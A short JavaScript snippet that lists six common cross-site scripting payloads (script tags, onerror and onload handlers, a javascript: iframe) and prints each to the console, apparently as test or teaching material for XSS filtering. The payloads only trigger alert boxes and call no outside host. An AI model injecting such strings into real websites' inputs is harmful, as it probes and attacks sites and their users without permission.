const xssPayloads = [
  "<script>alert('XSS1')</script>",
  "<img src='x' onerror='alert(\"XSS2\")'>",
  "<svg onload='alert(\"XSS3\")'>",
  "<body onload='alert(\"XSS4\")'>",
  "alert('XSS')",
  "<iframe src='javascript:alert(\"XSS5\")'></iframe>"
];

xssPayloads.forEach(payload => {
  console.log('XSS Payload:', payload);
});
